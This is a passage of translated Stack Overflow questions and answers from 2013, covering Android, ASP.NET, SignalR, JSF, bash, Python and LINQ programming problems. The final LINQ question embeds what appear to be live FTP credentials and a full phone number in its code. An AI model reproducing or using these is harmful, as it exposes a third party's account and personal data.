对于第二个问题，您必须使用 Sherlock 主题之一来运行您的项目。ActionBarSherlock 需要许多定义才能正确设置操作栏的样式。因此它需要这些样式并且您必须使用 ABS 主题。当然，您可以使用自己的主题，但您必须使用 Sherlock 的主题之一作为您的主题。有关这方面的更多信息，请参阅 Sherlock 主题指南。

更改您的 AndroidManifest.xml 文件以使用 Sherlock 主题：

```
<application
   android:allowBackup="true"
   android:icon="@drawable/ic_launcher"
   android:label="@string/app_name"
   android:theme="@style/Theme.Sherlock.Light" >

   <!-- ... -->

</application> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T14:01:12.450

只需扔掉 2 个 android-support-v4.jar 中的 1 个。两个库都包含它，因为它们需要它，但是当您将这些库链接在一起时，它们也会自动使用彼此的 .jar。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:03:25.793

删除 SAB 或 SM 中的 android 支持库，如果您只是在另一个项目中将这两个库用作库，请从 SAB 和 SM 中删除这两个库并将一个 android 支持库添加到您的主项目。库将显示红色 x 错误，但忽略它。您的应用程序应该可以正常编译。

# jquery - 如何使用 SignalR 向特定用户发送消息

> ID：15159504
> 
> 赞同：0
> 
> 时间：2013-03-01T13:59:12.623
> 
> 标签：jquery, asp.net, signalr

我刚刚将 SignalR 从 v 0.53 升级到 1.0.1，发现我用来在连接上设置 clientIds 的 IConnectionIdGenerator 接口不再存在（这让我很难过）。

现在的问题是，我该如何解决这个问题？

如何在无法设置每个特定用户连接 ID 的情况下向特定用户（或一组用户）发送消息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:46:25.880

我不熟悉 SignalR 的早期版本，但使用 v1.0.1 版本，您可以`Hub`使用该`Clients`属性在客户端上发送消息（调用 Javascript 方法）。

例如：
`Clients.Caller.addMessage(data);`- 向调用者客户端发送消息。 `Clients.All.addMessage(data);`- 向所有客户端发送消息。
等（检查[HubConnectionContext](https://github.com/SignalR/SignalR/blob/master/src/Microsoft.AspNet.SignalR.Core/Hubs/HubConnectionContext.cs)类）。

如果您需要维护客户端组，请使用该`Groups`属性。

您还可以使用`Context.ConnectionId`.

有关详细信息，您可以查看[SignalR Wiki](https://github.com/SignalR/SignalR/wiki/Hubs)页面。

希望这可以进一步帮助您。

# c# - 重复的cookies？

> ID：15159507
> 
> 赞同：3
> 
> 时间：2013-03-01T13:59:21.347
> 
> 标签：c#, asp.net, .net

我有一个利用cookie 来支持准向导的应用程序（即，它是一组相互导航到的页面，它们必须以特定的顺序出现，以便注册）。

当`Logon.aspx`页面加载时 - 默认页面 - 浏览器 cookie 看起来是正确的。

![在这里，我们只有一个 cookie。](../Images/8674d83f18a1a513a958167a6fc10d68.png)

有一个 cookie，它具有正确的价值。这可确保作为注册协议的下一页知道它是从该`Logon.aspx`页面加载的。但是，当我到达该页面时，浏览器的 cookie 看起来有很大不同：

![现在我们有两个相同的cookie。](../Images/ad748c6e01786eba873f69aa8faf9f73.png)

现在我们有两个相同的cookie。

这似乎不会*导致*任何真正的问题 - 但我不能确定它不会。所以，让我向您展示我用来设置 cookie 的代码（因为它可能有问题）：

```
if (!this.IsPostBack)
{
    Utility.HandleReferrer(Request, Response, "Logon.aspx");
    Response.Cookies["lastpage"].Value = "Enroll.aspx";
} 
```

该`HandleReferrer`方法如下所示：

```
static public void HandleReferrer(HttpRequest request, HttpResponse response, string expectedReferrer)
{
    var cookie = request.Cookies["lastpage"];
    if (cookie != null && cookie.Value.ToLower().Contains(expectedReferrer.ToLower()))
    {
        return;
    }

    response.Redirect("Logon.aspx");
} 
```

**那么，为什么它会复制这个 cookie？它似乎永远不会创造超过两个。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:04:10.993

我建议您执行以下操作之一。

首先，获取最新一瞥，然后再试一次。

如果它仍然显示 2 个具有该名称的 cookie，则获取[firebug](http://getfirebug.com/)和/或[fiddler](http://www.fiddler2.com/fiddler2/)并以这种方式查看。如果我不得不猜测，我会说一瞥有问题，或者你解释结果的方式有问题。也许一瞥正在显示在处理请求之前和之后存在哪些 cookie？

第三种选择是简单地从您自己的 .net 代码中发出 cookie 集合。就像是：

```
foreach(HttpCookie cookie in request.Cookies) {
  Response.Write(String.Format("{0} = {1}", cookie.Name, cookie.Value));
} 
```

看看会发生什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-27T13:47:22.217

我尝试了另一种方法，通过创建一个返回最新 cookie 出现的方法，这样我总能得到正确的数据。

该方法期望从 Request 中收集 cookie，以及搜索到的 cookie 的名称，并返回最新的票证（通常加密的信息）

```
private static FormsAuthenticationTicket GetLatestCookie(HttpCookieCollection cookies, string cookieName) {
    var cookieOccurrences = new List<FormsAuthenticationTicket>();

    for (int index = 0; index < cookies.Count; index++) {
        if (cookies.GetKey(index) == cookieName) {
            FormsAuthenticationTicket ticket = FormsAuthentication.Decrypt(cookies[index].Value);
            cookieOccurrences.Add(ticket);
        }
    }

    DateTime oldestTime = DateTime.MinValue;
    FormsAuthenticationTicket oldestTicket = null;
    foreach (var formsAuthenticationTicket in cookieOccurrences) {
        if (formsAuthenticationTicket.Expiration > oldestTime) {
            oldestTime = formsAuthenticationTicket.Expiration;
            oldestTicket = formsAuthenticationTicket;
        }
    }

    return oldestTicket;
} 
```

# c# - 获取在线文件大小的最快方法是什么 [http]

> ID：15159513
> 
> 赞同：3
> 
> 时间：2013-03-01T13:59:37.753
> 
> 标签：c#, httpwebrequest, size, filesize

我正在开发一个 YouTube 下载器，它可以获得所有可用质量的大小，但通常需要很长时间，有时它就像闪电一样！

我写了这个函数，它非常好[只是有时就像我之前说的那样]！

```
 Uri url = new Uri("http://example.com/document.docx");
    System.Net.HttpWebRequest request = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);
    System.Net.HttpWebResponse response = (System.Net.HttpWebResponse)request.GetResponse();
    response.Close();

    // iSize will handle the size of the file in bytes
    Int64 iSize = response.ContentLength; 
```

.

**那么，**有没有更快的方法来做到这一点？（请记住，要测量的文件超过八个文件）。

.

提前，非常感谢你；

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:03:12.560

这完全取决于 HTTP 服务器的表现如何。

规范说你可以发送一个 HEAD 请求来获取响应头，就像`Content-Length`不提供文件一样。

但是，许多服务器不这样做。

# android - 我该如何解决android应用记事本问题？（列表活动）

> ID：15159514
> 
> 赞同：0
> 
> 时间：2013-03-01T13:59:41.700
> 
> 标签：android

我正在尝试创建一个 android 应用记事本，但由于某种原因，应用程序在使用 ListView 进入页面时崩溃。我认为问题在于该类在 ListActivity 中扩展。有人可以帮助我吗？

NotesList 类代码：

```
package com.tim.csproject2;

import android.app.Activity;  
import android.app.Dialog; 
import android.app.ListActivity;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.view.ContextMenu;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ContextMenu.ContextMenuInfo;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.SimpleCursorAdapter;
import android.widget.TextView;
import android.widget.AdapterView.AdapterContextMenuInfo;

public class NotesList extends ListActivity implements OnClickListener{

    private static final int ACTIVITY_CREATE = 0;
    private static final int ACTIVITY_EDIT = 1;

    private static final int INSERT_ID = Menu.FIRST;
    private static final int DELETE_ID = Menu.FIRST+1;
    private static final int EDIT_ID = Menu.FIRST+2;

    private Button add, back, advanced;

    private ListView listV;

    private NotesDbAdapter myHelper;
    private Cursor myCursor;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.notes_menu);
        add = (Button) findViewById(R.id.add1);
        back = (Button) findViewById(R.id.back1);
        advanced = (Button) findViewById(R.id.advanced1);
        listV = (ListView) findViewById(R.id.listsList);

        add.setOnClickListener(this);
        back.setOnClickListener(this);
        advanced.setOnClickListener(this);
        listV.getAdapter();

        myHelper = new NotesDbAdapter(this);
        myHelper.open();
        fillData();
        registerForContextMenu(getListView());
    }

    private void fillData() {
         // Get all of the rows from the database and create the item list
        myCursor = myHelper.fetchAllNotes();
        startManagingCursor(myCursor);

        // Create an array to specify the fields we want to display in the list (only TITLE)
        String[] from = new String[]{NotesDbAdapter.KEY_TITLE};

        // and an array of the fields we want to bind those fields to (in this case just text1)
        int[] to = new int[]{R.id.text1};

        // Now create a simple cursor adapter and set it to display
        SimpleCursorAdapter notes = 
            new SimpleCursorAdapter(this, R.layout.notes_row, myCursor, from, to);
        setListAdapter(notes);
    }

    private void createNote() {
        Intent i = new Intent(this, NoteEdit.class);
        startActivityForResult(i, ACTIVITY_CREATE);
    }

    @Override
    public void onClick(View v) {
        // TODO Auto-generated method stub

    }

} 
```

note_menu xml 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:orientation="vertical"
         android:layout_width="match_parent"
         android:layout_height="match_parent"
         android:paddingLeft="8dp"
         android:paddingRight="8dp">

         <Button
            android:id="@+id/advanced1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="right"
            android:gravity="right"
            android:text="Advanced Menu"
            android:textSize="20dp"
            />

        <ListView 
            android:id="@android:id/list"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            />         
         <TextView 
             android:id="@android:id/empty"
             android:layout_width="match_parent"
             android:layout_height="match_parent"
             android:text="@string/no_notes"
            />  

         <Button
            android:id="@+id/add1"
            android:layout_width="250dp"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:gravity="center"
            android:text="Add Note"
            android:textSize="20dp"
            />

         <Button
            android:id="@+id/back1"
            android:layout_width="250dp"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:gravity="center"
            android:text="Back"
            android:textSize="20dp"
             />

</LinearLayout> 
```

nores_row xml 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<TextView android:id= "@+id/text1" xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    /> 
```

安卓清单：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.tim.csproject2"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="17" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >

        <activity
            android:name="com.tim.csproject2.IntroClass"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity> 
        <activity
            android:name=".MainMenu" 
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="com.tim.csproject2.MAINMENU" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>  
        <activity
            android:name=".NotesList" 
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="com.tim.csproject2.NOTELIST" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
        <activity
            android:name=".ListsList" 
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="com.tim.csproject2.LISTSLIST" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>    
        <activity android:name=".NoteEdit" />
  </application>
</manifest> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:06:50.170

我能看到的一个问题是

```
listV = (ListView) findViewById(R.id.listsList); 
```

应该

```
listV = getListView(); 
```

由于您的布局 xml 具有 ListView `android:id="@android:id/list"`，您还可以执行以下操作：

```
listV = (ListView) findViewById(android.R.id.list); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T09:39:53.100

对于 SimpleCursorAdapter，minSdkVersion 可能是个问题。代替

```
 import android.widget.SimpleCursorAdapter; 
```

尝试

```
 import android.support.v4.widget.SimpleCursorAdapter; 
```

# jsp - 一段时间后或按条件从 jsp 重定向到另一个

> ID：15159517
> 
> 赞同：0
> 
> 时间：2013-03-01T13:59:46.707
> 
> 标签：jsp, jsf, jakarta-ee, redirect, javabeans

我是jave ee的新手。我需要以下行为。我有一个注册用户队列。排在最前面的用户可以在 10 分钟内访问页面 A。10 分钟后，他应该被重定向到另一个页面 B 并从队列中删除。如果该用户注销/关闭浏览器，他也应该从队列中删除。

如果用户在页面 A 停留 10 分钟，我无法重定向到页面 B。

我正在尝试制作异步计时器，从而重定向到 B：

在页面 A 上：

```
<h:body>
    #{CheckBean.runTimer()}
... 
```

这是 CheckBean：

```
public class CheckBean {
    @EJB
    ActiveUserTimer timer;
    ...
    public void runTimer() {
        FacesContext context = FacesContext.getCurrentInstance();
        ExternalContext externalContext = context.getExternalContext();
        timer.run(externalContext, System.currentTimeMillis());
        ... 
```

EJB 计时器：

```
@Stateless
public class ActiveUserTimer{
    @Asynchronous
    public void run (ExternalContext externalContext, long time) {
        while (true) {
            if (System.currentTimeMillis() - time > 10000 || someFuncDetectedUserIsOffline()) {
                externalContext.redirect("../public/index.xhtml");
                Thread.sleep(1000);
            }
        }
    } 
```

问题是当我将 externalContext 传递给 run() 方法时 externalContext 不为空，但 externalContext.requestParameterMap 值为：

> 目标虚拟机发生异常：
> java.lang.NullPointerException：在 com.sun.enterprise.web.pwc.connector.coyote.PwcCoyoteRequest.setRequestEncodingFromSunWebXml（ PwcCoyoteRequest.java:188) 在 com.sun.enterprise.web.pwc.connector.coyote.PwcCoyoteRequest.getCharacterEncoding(PwcCoyoteRequest.java:129) 在 org.apache.catalina.connector.Request.parseRequestParameters(Request.java:3114)在 org.apache.catalina.connector.Request.getParameterNames(Request.java:1282) 在 org.apache.catalina.connector.RequestFacade.getParameterNames(RequestFacade.java:438) 在 com.sun.faces.context.RequestParameterMap.getEntryIterator (RequestParameterMap.java:126) 在 com.sun.faces.context.BaseContextMap$EntrySet.iterator(BaseContextMap.java:166) 在 com.sun.faces.context.BaseContextMap$BaseSet.size(BaseContextMap.java:154) 在 java.util.Collections$UnmodifiableCollection.size(Collections.java:996) 在 java.util.AbstractMap.size(AbstractMap .java:67) at java.util.Collections$UnmodifiableMap.size(Collections.java:1276) at com.mycompany.hib.ActiveUserTimer.run(ActiveUserTimer.java:29) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method ) 在 sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) 在 sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 在 java.lang.reflect.Method.invoke(Method.java:597) 在 org .glassfish.ejb.security.application.EJBSecurityManager.runMethod(EJBSecurityManager.java:1052) 在 org.glassfish.ejb.security.application.EJBSecurityManager。调用（EJBSecurityManager.java:1124）...

我查看了 Quartz，但我想如果我要传递 externalContext 实例，我会遇到确切的问题。有没有其他方法可以实现？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:37:19.947

此任务根本不需要任何服务器计时器。您可以使用纯 JavaScript 来完成。检查[`setTimeout`](http://www.w3schools.com/jsref/met_win_settimeout.asp)功能以解决您的问题。

知道了这一点，你可以做类似的事情

```
<script type="text/javascript">
    setTimeout(function() { 
        document.getElementById('myForm:btnContinue').submit();
        }, 10*1000*60);
</script>

<h:form id="myForm">
    <!-- page content... -->
    <h:commandButton id="btnContinue" value="Continue" action="#{bean.continue}" />
</h:form> 
```

# c++ - 什么是三位一体 API

> ID：15159525
> 
> 赞同：2
> 
> 时间：2013-03-01T14:00:14.713
> 
> 标签：c++, api

我偶然发现了一份我真正感兴趣的工作机会，其中一句话似乎让我有些茫然。

> 必须精通 C++ 和*Trinity* API（将被测试）

我对 C++ 和应用程序编程接口有一些了解，但我不知道“Trinity”指的是什么。

我试过在互联网上搜索，但没有找到一个像样的答案，它可以真正告诉我它的实际含义，或者它涉及的知识。

任何信息将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:07:09.437

这个网站应该解释你需要知道的关于 Trinity 和 API 的所有信息：

[http://www.trinitydesktop.org/](http://www.trinitydesktop.org/)

# bash - 如何知道叉子中所有叉子的pid？

> ID：15159526
> 
> 赞同：1
> 
> 时间：2013-03-01T14:00:15.027
> 
> 标签：bash, process, fork, execve

例子：

```
$ cat main.sh
#!/bin/bash
./child_level1.sh &

$ cat child_level1.sh
#!/bin/bash
./child_level2.sh &

$ cat child_level2.sh
#!/bin/bash
echo Hi, fork()s! &

$ ./main.sh # outputs Hi, fork()s 
```

目标：编写一个脚本**follow.sh**，它运行 $1 并收集所有分叉的 pid。像那样：

```
$ ./follow.sh ./main.sh
[pid_main.sh] [pid_child_level1.sh] [pid_child_level2.sh] [pid_of_echo] 
```

该示例为 4 个数字）。这些数字可能会在一段时间后出现。**也许实用程序follow.sh**有一个已知名称，例如**pidtracer**？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:18:05.150

该变量`$!`给出了您在后台运行的最新命令的 PID。因此，请立即尝试`echo $!`执行每个后台命令。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:08:13.570

这是使用名称存储在环境变量中的临时文件的简单解决方案：

```
$ cat main.sh
#!/bin/bash
export mytrace="pids-from-$$.tmp"
echo $$ >| "$mytrace"
./child_level1.sh &

$ cat child_level1.sh
#!/bin/bash
echo $$ >> "$mytrace"
./child_level2.sh &

$ cat child_level2.sh
#!/bin/bash
echo $$ >> "$mytrace"
echo -n "The pids are: "
tr \\n ' ' < "$mytrace"
echo
rm -f "$mytrace" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-04T18:12:35.903

感谢@tripleee。我认为这是一个很好的解决方案。

```
$ cat ./wrap_fork.c
//fork wrapper.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>

pid_t fork(void){
  FILE * f = fopen("/tmp/dearforks","a");
  typedef pid_t (*t_fork)(void);
  t_fork org_fork = dlsym(((void *) -1l), "fork");
  pid_t p = org_fork();
  fprintf(f,"pid = %i\n",p);
  fclose(f);
  return p;
}

$ gcc -fPIC -c -Wall wrap_fork.c
$ gcc -shared wrap_fork.o -ldl -lstdc++ -o wrap_fork.so 
```

现在**关注.sh**

```
$ cat follow.sh
#!/bin/bash
export LD_PRELOAD=./wrap_fork.so
$* & 
```

现在，是时候执行了：

```
./follow.sh ./main.sh 
```

结果：

```
$ cat /tmp/dearforks
pid = 2065
pid = 0
pid = 2066
pid = 0
pid = 2067
pid = 0 
```

它尝到了我想要的味道。除了一些零）（*以及将来调用**睡眠**后的pid ：（*）

为什么结果中*有零*？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T14:37:07.310

你不会找到所有的 pid，因为脚本退出太快了。如果它们运行的​​时间足够长，您可以使用

```
ps axo ppid,pid,comm 
```

获取所有进程的父 pid、脚本 pid 和命令名称。然后，您可以从您的第一个脚本 pid 开始构建树`$!`。

# python - os.walk() ValueError: 需要超过 1 个值才能解压

> ID：15159527
> 
> 赞同：9
> 
> 时间：2013-03-01T14:00:18.067
> 
> 标签：python, scripting, os.walk

好的，我正在使用 Bioloid Premium 类人机器人，Mac OS X 无法识别它。因此，我编写了一个 Python 脚本来检测我的 /dev/ 文件夹中的更改，因为基于 Linux 的系统上的任何连接仍然通过文件描述符获得引用。我的代码应该可以工作，但是，当将三个变量分配给 os.walk(top) 返回的值时，我得到一个 ValueError。有谁知道我该如何解决这个问题？我过去使用过这个功能，它并没有给我带来任何麻烦。顺便说一句，我的脚本很粗糙，我大约用了 5 分钟左右就写好了。

代码：

```
root_o, dir_o, files_o = os.walk(top) 
```

错误如下。

```
Traceback (most recent call last):
  File "detectdevs.py", line 15, in <module>
    findDevs()
  File "detectdevs.py", line 11, in findDevs
    root_o, dir_o, files_o = os.walk(top)
ValueError: need more than 1 value to unpack 
```

我确实搜索了 stackoverflow，但我看到的 ValueError 问题都没有引用 os.walk() 函数。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-03-01T14:03:39.197

`os.walk`返回产生三元组而不是三元组的迭代器：

```
for root, dirs, files in os.walk(top):
    # do stuff with root, dirs, and files 
```

```
 In [7]: os.walk('.')
    Out[7]: <generator object walk at 0x1707050>

    In [8]: next(os.walk('.'))
    Out[8]:
    ('.',
     ['.vim',
      '.git',
       ...],
     ['.inputrc',
      ...]) 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-03-01T14:03:51.457

您需要*迭代*：`os.walk()`

```
for root_o, dir_o, files_o in os.walk(top): 
```

或者先存储迭代器，然后循环：

```
walker = os.walk(top)
for root_o, dir_o, files_o in walker: 
```

可调用的返回值是一个生成器函数，只有当您迭代它（使用`for`循环或通过调用`next()`迭代器）时，它才会产生 3 值元组。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-01T14:04:25.003

试试这个

```
for root_o, dir_o, files_o in os.walk(top)
    print root_o, dir_o, files_o 
```

`os.walk`是一个生成器，您需要对其进行迭代。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T14:13:44.047

也许这里更有用的是它说“解包超过 1 个值”。

*看，在 python 中，你将一个元组*（或列表，可能是）“解包”到相同数量的变量中：

```
a, b, c = (1, 2, 3) 
```

出现了一些不同的错误：

```
>>> a, b, c = (1, 2, 3, 4, 5, 6)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: too many values to unpack

>>> a, b, c = (1, 2)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: need more than 2 values to unpack 
```

具体来说，最后一个错误是您遇到的错误类型。os.walk() 返回一个*迭代器*，即单个值。您需要强制该迭代器在它开始为您提供可以解包的值之前产生**！**

这就是 os.walk(); 的意义所在。它*迫使*你绕过它，因为它试图走路！因此，以下代码段可能对您更有效。

```
for root_o, dir_o, files_o in os.walk(top):
    make_magic_happen(root_o, dir_o, files_o) 
```

# javascript - 将语言选择写入 jQuery 文件？

> ID：15159534
> 
> 赞同：1
> 
> 时间：2013-03-01T14:00:59.890
> 
> 标签：javascript, jquery, variables, file-io

我目前正在编写一个将使用多种语言的网站，我想知道是否有一种简单的方法可以为所有语言只对网站进行一次编程。

例如，我有一个名为“lang”的变量。基本上，如果用户选择西班牙语，那么我希望页面为带有西班牙语而不是英语的按钮加载图像（或任何资产）。例如，通过更改“lang”变量，名为“home_button_eng.jpg”的图像将改为加载“home_button_spa.jpg”。

我认为这将需要“编写”或“更改”包含“lang”变量的外部文档，然后由页面加载。换句话说，用户单击'spanish'，这使得 lang='spa' 然后加载一个新页面，该页面连接到该 language_choice.js 文件。加载适当的内容。

有没有办法做到这一点？我宁愿这样做，也不愿为西班牙语复制每个英文页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:09:22.303

当然，您不想复制任何内容或代码。我会根据他们的语言代码组织子文件夹中的所有资产：

```
content\
    en\
       images\
    sp\
       images\ 
```

这样可以避免在每种语言的单个文件夹中重复命名文件。更改语言时，您可以将会话变量存储在您选择的动态语言（Python、PHP、Ruby...）中，并使用它用正确的语言代码填充所有内容。

根据您的内容的动态程度，您可以使用`.po`和`.mo`国际化文件来实现它，并将它们读入以获取您的标题、文本等，同时仍然仅根据语言目录隐式确定图像和其他资产的位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:09:24.303

如果您的所有语言特定更改都与图像有关，您可以动态加载特定语言的 CSS 文件。

如果您也有文本，您可能希望为您支持的每种语言创建一个本地化 JSON 对象并动态加载它。JSON 对象将包含具有特定语言文本或图像源的元素 ID 或元素类，您将使用 JavaScript 迭代对象键并在其中的元素引用上填充语言特定数据。

# android - 两指或 pinc 缩放到 osmdroid 中的 mapview

> ID：15159544
> 
> 赞同：4
> 
> 时间：2013-03-01T14:01:44.747
> 
> 标签：android, zooming, android-mapview, multi-touch, osmdroid

我需要帮助

我试图通过让用户多点触摸（首先是 2 个手指触摸）来缩放到 mapview 我知道有 setMultiTouchControls() 功能，但这不是我想要做的。

我试图用图片来解释：）这比写更容易；

黑色粗体箭头显示手指的移动方向。相同的情况可以考虑相反的方向。（放大）

![osmdroid mapview 多点触控](../Images/c73574b3f321ecc02bb46d318724022f.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-11-06T08:46:34.223

最后，在 osmdroid 3.0.10 中已经实现了这个特性。

```
mapView.setBuiltInZoomControls(true);
mapView.setMultiTouchControls(true); 
```

# .net - 引用对象时，是否总是必须作为参数传递

> ID：15159549
> 
> 赞同：0
> 
> 时间：2013-03-01T14:01:58.407
> 
> 标签：.net, parameters

我有一个关于 2 个单独的类实例如何知道每个实例的问题。

假设我有一个空的控制台应用程序，并且在 2 个单独的命名空间中添加了 2 个类。

每个类的细节并不重要，所以请考虑我的控制台应用程序中的这个非常简单的代码。

```
public static void Main(string[] args)
{
    Namespace1.ClassName = c = new Namespace1.ClassName();
    Namespace2.ClassName2 = c2 = new Namespace2.ClassName2();
} 
```

现在，除非我将实例传递给（例如）我的 ClassName2 的构造函数，否则`c2`将不知道`c`EG

```
Namespace2.ClassName2 = c2 = new Namespace2.ClassName2(c); 
```

有没有其他方法可以`c2`在`c`不`c`作为参数传递或设置为`c2`.

我认为不是，但我错了很多次，我只是在澄清之后。我主要寻找一个简单的是或否的答案，但也感谢任何其他细节。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:09:04.747

我认为除了构造函数参数之外，您可以这样做的唯一方法是在其中创建一个属性或一个 setter 函数，`ClassName2`而不是在创建`c2`实例后设置它

```
Namespace2.ClassName2 c2 = new Namespace2.ClassName2();
c2.SetC(c); 
```

理论上你也可以使类`ClassName`静态，但这不是一个好主意

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:14:25.710

您可以使用`public static`属性，例如，如果您的主要方法在一个`Namespace3.Program`类中，您可以将其声明为：

```
// namespace3
public class Program {
     public static Namespace1.Classname c {get;set;}

     public static void Main(string[] args)
     {
        Pragram.c = new Namespace1.ClassName();
        Namespace2.ClassName2 c2 = new namespace2.ClassName2();
     }
} 
```

然后在 ClassName2 方法调用中

```
namespace3.Program.c 
```

# mp3 - 使用 J2ME 在 Symbian Belle 中播放 mp3

> ID：15159551
> 
> 赞同：0
> 
> 时间：2013-03-01T14:01:59.100
> 
> 标签：mp3, symbian, audio-player

我是 Symbian 新手，我的目标是用我的 MIDLet 播放存储在手机上的 mp3 文件。是否可以？我不知道该怎么做 - 我会非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-26T01:43:46.320

J2ME 提供的 API 可以做到这一点。

第一步。您需要验证您的特定手机是否具有所需的功能。安装任何免费的 J2ME mp3 应用程序，例如 KD Player ( [http://en.wikipedia.org/wiki/KD_Player](http://en.wikipedia.org/wiki/KD_Player) ) 并尝试在您的手机上使用它。

第二步。如果您的手机可以使用免费应用程序播放 mp3 音乐，但您仍想创建自己的，您需要找到一个好的 J2ME 资源，如下所示： [http ://www.oracle.com/technetwork/systems/index-156363.html](http://www.oracle.com/technetwork/systems/index-156363.html)

老实说，第二步可能有点过头了，特别是如果你是那种先问而不是使用谷歌的人。对不起。

# java - 为什么小部件不更新？

> ID：15159552
> 
> 赞同：1
> 
> 时间：2013-03-01T14:01:59.470
> 
> 标签：java, android, android-widget

我正在用每日记住单词制作字典，我想在小部件上显示它。当我更改下一个单词时，小部件不会更新。如何使小部件更新。请帮我！这是我的课：

```
public class HelloWidget extends AppWidgetProvider {
private SharedPreferences sharename, sharedescribed;
private SharedPreferences na, dess;

@Override
public void onUpdate(Context context, AppWidgetManager appWidgetManager,int[] appWidgetIds) {
    final int N = appWidgetIds.length;

    for (int i = 0; i < N; i++)
    {
        int appWidgetId = appWidgetIds[i];

        SharedPreferences sharename = PreferenceManager.getDefaultSharedPreferences(context);
        String na = sharename.getString("thename", "null");

        SharedPreferences sharedescribed = PreferenceManager.getDefaultSharedPreferences(context);
        String dess = sharedescribed.getString("thedescribed", "null");

        RemoteViews views = new RemoteViews(context.getPackageName(),
                R.layout.main2);

        views.setTextViewText(R.id.widget_textview, na);
        views.setTextViewText(R.id.widget_textview2, dess);

        appWidgetManager.updateAppWidget(appWidgetId, views);
    }

    super.onUpdate(context, appWidgetManager, appWidgetIds);

} 
```

}

# linq - 如何使用 Linq 仅选择包含条件的字符串记录

> ID：15159558
> 
> 赞同：0
> 
> 时间：2013-03-01T14:02:16.880
> 
> 标签：linq, linq-to-entities

我正在尝试迭代 sting[] 并仅获取符合条件“包含”的记录。

我一直在尝试这个：

```
var lines = File.ReadAllLines("C:\\temp\\" + ReportPushFile("fileToSend_1.txt")).Where(i => i.Contains("BILL")); 
```

但这会再次返回我所有记录，而无需过滤。怎么了？

```
class Program : Logger
{
    public static FTPclient Ftp = new FTPclient("ftp://smsftp.mobyt.it/", "C17053_004", "i7z0dx5b");

    static void Main(string[] args)
    {
        List<Sms> sms = new List<Sms>();
        sms.Add(new Sms() {  recipient = "+393664528452" });

        var lines = File.ReadAllLines("C:\\temp\\" + ReportPushFile("fileToSend_1.txt")).Where(i => i.StartsWith("BILL"));

        // ...
    }

    public static string ReportPushFile(string NomeFile)
    {
        try
        {
            String LocalFileName = Ftp.ListDirectory("/reports/").Where(f => f.Contains(NomeFile)).OrderBy(x => new FileInfo(x).CreationTime).Max();
            Ftp.Download("/reports/" + LocalFileName, "c:\\temp\\" + LocalFileName, true);

            return LocalFileName;
        }
        catch(Exception ex)
        {
            return string.Empty;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:12:18.997

您的代码应该可以工作。让我们将其拆分并明确类型：

```
string path = "C:\\temp\\" + ReportPushFile("fileToSend_1.txt");
